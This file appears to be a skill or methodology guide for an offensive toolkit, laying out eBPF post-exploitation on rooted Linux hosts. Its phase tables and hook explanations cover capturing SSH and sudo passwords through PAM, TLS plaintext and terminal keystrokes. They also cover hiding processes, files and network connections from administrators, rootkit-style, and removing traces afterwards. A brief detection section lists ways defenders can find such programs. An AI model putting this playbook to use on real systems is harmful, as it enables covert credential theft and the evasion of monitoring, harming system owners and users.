---
name: ebpf-attacks
description: eBPF-based post-exploitation for kernel-level credential harvesting, process hiding, and traffic interception on Linux
category: post-exploitation
tags: [ebpf, bpf, kernel, post-exploitation, credential-access, defense-evasion, persistence, linux, rootkit]
tech_stack: [linux, ebpf, kernel, bcc]
cwe_ids: [CWE-269, CWE-522, CWE-693]
chains_with: [T1014, T1055, T1556, T1205.002, T1003, T1059.004]
prerequisites: [T1068, T1548]
version: "1.0"
---

# eBPF Post-Exploitation Methodology

eBPF (Extended Berkeley Packet Filter) enables kernel-level instrumentation without loading kernel modules. After gaining root on a Linux target, eBPF programs can intercept system calls, userspace function calls, and network traffic — operating below userland monitoring tools.

## Prerequisites

Before deploying eBPF tools, verify:

1. **Root access** — all eBPF operations require `CAP_SYS_ADMIN` or `CAP_BPF`
2. **Kernel version** — Linux 4.18+ for full BPF features, 5.8+ for BPF ring buffer
3. **BCC installed** — `python3 -c "from bcc import BPF"` must succeed on target
4. **No BPF LSM** — check `cat /sys/kernel/security/lsm` for bpf restrictions

```bash
# Quick prerequisite check
uname -r                                    # kernel version
cat /proc/config.gz | zcat | grep CONFIG_BPF  # BPF config
ls /sys/fs/bpf/                             # BPF filesystem mounted
python3 -c "from bcc import BPF; print('OK')" # BCC available
```

## Kill Chain Phases

### Phase 1 — Situational Awareness (First 60 seconds)

Understand the environment before deploying persistent hooks.

| Action | Command | Purpose |
|--------|---------|---------|
| Scan dependencies | `ebpf dep_scan` | Map all loaded libraries across all processes |
| Vuln check | `ebpf dep_scan --json-output` | Identify vulnerable library versions |
| Monitor executions | `ebpf execve_sniff --duration 30` | Understand what runs on the system — cron, services, monitoring |
| DNS baseline | `ebpf dns_sniff --duration 30` | Map DNS activity — identify internal services, C2 detection |

### Phase 2 — Credential Harvesting

Intercept credentials at the kernel level — no file modification, no log entries.

| Action | Command | Purpose |
|--------|---------|---------|
| PAM interception | `ebpf pam_sniff --duration 300` | Capture SSH, sudo, su, login passwords in cleartext |
| TLS interception | `ebpf ssl_sniff --pid <PID>` | Capture HTTPS plaintext for a specific service |
| Keystroke capture | `ebpf keylog --duration 120` | Capture interactive terminal input from TTY sessions |

**PAM sniffing** hooks `pam_get_authtok` in `libpam.so` via uprobe. Every authentication event (SSH login, sudo, su, screen unlock) passes through PAM — the cleartext password is captured before hashing.

**SSL sniffing** hooks `SSL_write` and `SSL_read` in `libssl.so`. Data is captured in plaintext before encryption (write) and after decryption (read). Use `--pid` to target a specific process (e.g., a web application handling API keys).

**Keystroke logging** hooks `sys_read` on TTY file descriptors (`/dev/tty*`, `/dev/pts/*`). Captures all interactive terminal input including passwords typed in non-echo mode.

### Phase 3 — Stealth Operations

Hide your presence from system administrators and monitoring tools.

| Action | Command | Purpose |
|--------|---------|---------|
| Hide process | `ebpf proc_hide --pid <PID>` | Remove process from ps, top, htop, /proc listing |
| Hide files | `ebpf file_hide --name <NAME>` | Remove file/directory from ls, find, directory listings |
| Hide connections | `ebpf conn_hide --port <PORT>` | Remove network connection from netstat, ss, /proc/net/tcp |

**Process hiding** hooks `sys_getdents64` on `/proc`. When the kernel returns directory entries, entries matching the target PID are overwritten with `.` — the process becomes invisible to all userland tools that enumerate `/proc`.

**File hiding** uses the same `sys_getdents64` hook but matches against a filename instead of a PID. Effective for hiding implants, scripts, and data exfiltration staging directories.

**Connection hiding** hooks `sys_read` on `/proc/net/tcp` and `/proc/net/tcp6`. When a monitoring tool reads the connection table, lines containing the target port are overwritten with spaces.

### Phase 4 — Cleanup (MANDATORY)

Always run cleanup before exiting a target.

```bash
# List all CyberStrike eBPF programs on the system
ebpf cleanup

# Remove all CyberStrike eBPF programs
ebpf cleanup --remove --force

# Dry run — show what would be removed
ebpf cleanup --dry-run
```

The cleanup tool uses three detection methods:
1. `bpftool prog list` — enumerate all loaded BPF programs
2. `/sys/fs/bpf/` — check for pinned programs
3. `/sys/kernel/debug/tracing/` — check for registered kprobe/uprobe events

## Detection Considerations

eBPF programs are detectable by:
- `bpftool prog list` — shows all loaded BPF programs
- `/sys/kernel/debug/tracing/kprobe_events` — shows registered kprobes
- `/sys/kernel/debug/tracing/uprobe_events` — shows registered uprobes
- `auditd` rules on `bpf()` syscall — `auditctl -a always,exit -F arch=b64 -S bpf`
- EDR agents with BPF LSM hooks (Falco, Tracee, Tetragon)

## Program Reference

| Program | Hook Type | Target | MITRE ATT&CK |
|---------|-----------|--------|---------------|
| pam_sniff | uprobe | `pam_get_authtok` in libpam.so | T1556 — Modify Authentication Process |
| ssl_sniff | uprobe | `SSL_write`/`SSL_read` in libssl.so | T1040 — Network Sniffing |
| dep_scan | procfs | `/proc/<pid>/maps` | T1518 — Software Discovery |
| proc_hide | kprobe | `sys_getdents64` on /proc | T1014 — Rootkit |
| file_hide | kprobe | `sys_getdents64` | T1014 — Rootkit |
| conn_hide | kprobe | `sys_read` on /proc/net/tcp | T1014 — Rootkit |
| execve_sniff | tracepoint | `sys_execve` | T1057 — Process Discovery |
| dns_sniff | kprobe | `udp_sendmsg` port 53 | T1071.004 — DNS Application Layer Protocol |
| keylog | kprobe | `sys_read` on TTY fds | T1056.001 — Keylogging |
| cleanup | bpftool | BPF programs/maps | — |
